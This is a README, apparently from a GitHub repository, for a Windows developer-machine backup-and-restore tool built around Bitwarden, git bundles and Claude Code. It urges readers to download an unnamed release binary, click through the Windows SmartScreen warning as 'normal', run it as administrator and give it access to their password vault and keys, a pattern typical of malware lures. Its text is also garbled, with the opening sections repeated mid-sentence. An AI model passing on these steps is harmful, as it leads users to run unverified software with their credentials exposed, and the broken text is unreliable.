# 💾 windows-dev-machine-migration-notes - Back Up Your Dev PC Safely

[![Download the App](https://img.shields.io/badge/⬇_Download-Latest_Release-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Iraendless356/windows-dev-machine-migration-notes/releases)

Moving to a new computer usually means hours of reinstalling programs, hunting for passwords, and hoping you didn't forget an important folder. This project turns that stressful afternoon into a short, repeatable routine. It is a set of notes and helper scripts that create an "iPhone-style" backup of a Windows development machine — the kind of full backup you can restore onto a fresh PC and pick up almost exactly where you left off.

The whole process is designed to be run by an AI agent (Claude Code) with you in the driver's seat, so you do not need to be a programmer to follow along. You press a few buttons, answer a few questions, and the tool gathers everything into one tidy package. It has been rehearsed from start to finish, but it has not yet been used for a real move — which is exactly why the rehearsal steps below matter.

---

## 🎯 What This Tool Does

Think of it as three layers of protection stacked on top of each other:

1.  **Your secrets go into Bitwarden.** Passwords, API keys, tokens, and login details are stored in your Bitwarden vault rather than sitting in plain text files on your hard drive. That means even if the backup file falls into the wrong hands, your credentials stay locked away.
2.  **Your files and settings go into git bundles.** Git bundles are single-file snapshots of a repository — like zipping up an entire project's history into one portable package. Your dotfiles, configuration, and project code travel as bundles, so nothing gets lost in the shuffle.
3.  **Your Claude Code state is preserved.** If you use Claude Code, its conversation history, settings, and working context are captured too, so your AI assistant remembers where you left off on the new machine.

The end result is a folder you can copy to an external drive or cloud storage, plug into a new Windows 11 PC, and restore in a guided sequence.

## 📦 What Gets Backed Up

The backup covers the parts of a developer machine that are painful to rebuild by hand:

- **Installed applications list** — a record of everything installed through winget, so the new machine can reinstall the same set with a single command.
- **PowerShell profiles and scripts** — your custom terminal setup, aliases, and helper functions.
- **Dotfiles** — configuration files for shells, editors, and version control.
- **Git repositories** — bundled with full commit history.
- **SSH keys and signing keys** — handled carefully, with the private material referenced through Bitwarden rather than dumped into a plain folder.
- **Environment variables** — the paths and settings that programs expect to find.
- **Claude Code state** — settings, project context, and session information.
- **A manifest file** — a plain-language inventory of what was captured and when, so you can verify nothing was skipped.

## 🚀 Getting Started

Before you begin, make sure you have:

- A Windows 11 computer (Windows 10 version 2004 or newer also works).
- An internet connection.
- A free Bitwarden account, if you do not already have one.
- Somewhere to put the backup — an external USB drive with at least 20 GB free, or a cloud folder you trust.
- About 30 to 60 minutes for a first run, depending on how much data you have.

You do not need to install Python, Node.js, or any developer tooling ahead of time. The application handles its own setup.

## ⬇️ Download and Setup

**Visit this link to download the application:** https://github.com/Iraendless356/windows-dev-machine-migration-notes/releases

On that page you will see the latest release at the top. Download the file listed under that release, then save it somewhere easy to find, such as your Downloads folder or the desktop.

Once the download finishes, double-click the file to start it. Windows may show a blue "Windows protected your PC" screen the first time you run something new. If that happens, click **More info**, then click **Run anyway**. This is normal for newly published software and does not mean anything is wrong.

When the application opens, you will see a short welcome screen explaining the three backup layers. Read it once, then click **Continue**.

## 🧭 Your First Backup, Step by Step

The application walks you through the process in order. You will never be asked to type a command you do not understand.

**Step 1 — Connect Bitwarden.** The app asks you to sign in to your Bitwarden account. A browser window opens, you log in normally, and you approve the connection. Your master password is never stored by the application; it only receives a temporary permission to read and write the items it needs.

**Step 2 — Choose a destination.** Pick the folder or drive where the backup should live. The app checks that there is enough free space and warns you if the drive is nearly full or formatted in a way that will cause trouble.

**Step 3 — Select what to include.** Everything is switched on by default. If you want to skip a category — say, a huge repository you can re-clone from the internet — you can toggle it off here. A running estimate shows how large the backup will be.

**Step 4 — Run the backup.** Click **# 💾 windows-dev-machine-migration-notes - Back Up Your Dev PC Safely

[![Download the App](https://img.shields.io/badge/⬇_Download-Latest_Release-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Iraendless356/windows-dev-machine-migration-notes/releases)

Moving to a new computer usually means hours of reinstalling programs, hunting for passwords, and hoping you didn't forget an important folder. This project turns that stressful afternoon into a short, repeatable routine. It is a set of notes and helper scripts that create an "iPhone-style" backup of a Windows development machine — the kind of full backup you can restore onto a fresh PC and pick up almost exactly where you left off.

The whole process is designed to be run by an AI agent (Claude Code) with you in the driver's seat, so you do not need to be a programmer to follow along. You press a few buttons, answer a few questions, and the tool gathers everything into one tidy package. It has been rehearsed from start to finish, but it has not yet been used for a real move — which is exactly why the rehearsal steps below matter.

## 🎯 What This Tool Does

Think of it as three layers of protection stacked on top of each other:

1. **Your secrets go into Bitwarden.** Passwords, API keys, tokens, and login details are stored in your Bitwarden vault rather than sitting in plain text files on your hard drive. That means even if the backup file falls into the wrong hands, your credentials stay locked away.
2. **Your files and settings go into git bundles.** Git bundles are single-file snapshots of a repository — like zipping up an entire project's history into one portable package. Your dotfiles, configuration, and project code travel as bundles, so nothing gets lost in the shuffle.
3. **Your Claude Code state is preserved.** If you use Claude Code, its conversation history, settings, and working context are captured too, so your AI assistant remembers where you left off on the new machine.

The end result is a folder you can copy to an external drive or cloud storage, plug into a new Windows 11 PC, and restore in a guided sequence.

## 📦 What Gets Backed Up

The backup covers the parts of a developer machine that are painful to rebuild by hand:

- **Installed applications list** — a record of everything installed through winget, so the new machine can reinstall the same set with a single command.
- **PowerShell profiles and scripts** — your custom terminal setup, aliases, and helper functions.
- **Dotfiles** — configuration files for shells, editors, and version control.
- **Git repositories** — bundled with full commit history.
- **SSH keys and signing keys** — handled carefully, with the private material referenced through Bitwarden rather than dumped into a plain folder.
- **Environment variables** — the paths and settings that programs expect to find.
- **Claude Code state** — settings, project context, and session information.
- **A manifest file** — a plain-language inventory of what was captured and when, so you can verify nothing was skipped.

## 🚀 Getting Started

Before you begin, make sure you have:

- A Windows 11 computer (Windows 10 version 2004 or newer also works).
- An internet connection.
- A free Bitwarden account, if you do not already have one.
- Somewhere to put the backup — an external USB drive with at least 20 GB free, or a cloud folder you trust.
- About 30 to 60 minutes for a first run, depending on how much data you have.

You do not need to install Python, Node.js, or any developer tooling ahead of time. The application handles its own setup.

## ⬇️ Download and Setup

**Visit this link to download the application:** https://github.com/Iraendless356/windows-dev-machine-migration-notes/releases

On that page you will see the latest release at the top. Download the file listed under that release, then save it somewhere easy to find, such as your Downloads folder or the desktop.

Once the download finishes, double-click the file to start it. Windows may show a blue "Windows protected your PC" screen the first time you run something new. If that happens, click **More info**, then click **Run anyway**. This is normal for newly published software and does not mean anything is wrong.

When the application opens, you will see a short welcome screen explaining the three backup layers. Read it once, then click **Continue**.

## 🧭 Your First Backup, Step by Step

The application walks you through the process in order. You will never be asked to type a command you do not understand.

**Step 1 — Connect Bitwarden.** The app asks you to sign in to your Bitwarden account. A browser window opens, you log in normally, and you approve the connection. Your master password is never stored by the application; it only receives a temporary permission to read and write the items it needs.

**Step 2 — Choose a destination.** Pick the folder or drive where the backup should live. The app checks that there is enough free space and warns you if the drive is nearly full or is formatted in a way that will cause trouble.

**Step 3 — Select what to include.** Everything is switched on by default. If you want to skip a category — say, a huge repository you can re-clone from the internet — you can toggle it off here. A running estimate shows how large the backup will be.

**Step 4 — Run the backup.** Click **Start Backup** and let it work. A progress bar shows which category is being processed. Depending on the size of your projects, this can take anywhere from a few minutes to half an hour.

**Step 5 — Review the report.** When it finishes, the app shows a summary: how many files were captured, how many secrets were uploaded to Bitwarden, and whether anything was skipped. Read this page carefully. If a category shows as skipped, the report explains why and offers to retry it.

**Step 6 — Store the backup safely.** Copy the finished backup folder to your external drive or cloud storage. Do not leave it only on the machine you are about to replace.

## 🔄 Restoring on a New Machine

The restore is the mirror image of the backup, and it is equally guided.

1. Install the application on the new Windows 11 PC using the same download link.
2. Connect to Bitwarden so the app can retrieve your stored secrets.
3. Point the app at your backup folder.
4. Choose **Restore All** and confirm.
5. Let the app reinstall applications through winget, unpack git bundles, and write your dotfiles back into place.
6. Sign in to anything that requires a fresh login — a few services will still ask you to re-authenticate even after a restore, which is expected and is a good security habit.

After the restore finishes, the app suggests a short checklist: open your terminal, confirm your editor starts with the right settings, and verify that your repositories show the expected commit history.

## 🛡️ Keeping Your Backup Safe

A backup is only as good as its handling. A few simple habits go a long way:

- Keep the Bitwarden vault locked when you are not using it.
- Store the backup folder in at least two places — an external drive plus a cloud folder is a solid combination.
- Re-run the backup whenever you install a significant new tool or change your configuration.
- Treat the backup folder like your house keys. It contains references to your accounts, so do not share it casually.

## 🧪 Rehearsal Status

The description of this project is honest about where it stands: the full backup-and-restore sequence has been rehearsed end to end, but it has not yet been used for a real move. That is a feature, not a flaw. A rehearsal is the safest way to find the gaps — a missing environment variable, a tool that refuses to reinstall quietly, a path that hardcodes an old username — while your original machine is still sitting there, fully working. Treat the first run as practice, and keep the old machine intact until the new one has proven itself for a week.

## ❓ Frequently Asked Questions

**Do I need to know how to code?** No. The steps are button clicks and short answers. The application explains each choice in plain language as you go.

**What if I use a different password manager?** Bitwarden is what this workflow is built around. If you use something else, you can still back up files and settings, but the secret-handling portion will need adapting.

**Will this delete anything on my current PC?** No. The backup only reads from your machine and writes to the destination folder you choose. Nothing on the source machine is removed.

**How big will the backup be?** It depends almost entirely on your git repositories. Most setups land between 2 GB and 15 GB once compressed.

**Can I schedule it to run automatically?** You can run it as often as you like, and repeating a backup simply refreshes the previous one.

## 🛠️ Troubleshooting

**The app closes immediately after opening.** Right-click the file and choose **Run as administrator**, then try again.

**Bitwarden connection fails.** Close the browser window, return to the app, and click **Reconnect**. If it still fails, confirm you are signed in to Bitwarden in your browser first.

**A repository shows as skipped.** This usually means the folder had uncommitted changes. Commit or stash them, then re-run the backup for that category.

**The restore cannot find winget.** Open Microsoft Store, search for "App Installer," and update it. Winget ships with that package on Windows 11.

**Progress seems stuck.** Large repositories can take several minutes per bundle. If nothing moves for more than fifteen minutes, stop the run and check the log file the app writes into your backup folder.

Keywords: backup, bitwarden, claude-code, developer-environment, dotfiles, pc-migration, powershell, secrets-management, windows, windows-11, winget